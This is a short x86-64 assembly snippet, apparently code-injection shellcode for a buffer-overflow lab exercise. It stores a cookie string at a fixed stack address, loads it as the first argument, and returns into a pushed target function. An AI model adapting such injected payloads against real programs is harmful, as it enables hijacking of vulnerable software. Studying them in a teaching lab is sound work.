pushq $0x4018fa
movq $0x5561d000, %rdi
movq $0x6166373939623935, %rax
movq %rax, (%rdi)
xor %rax, %rax
movq %rax, 8(%rdi)
ret
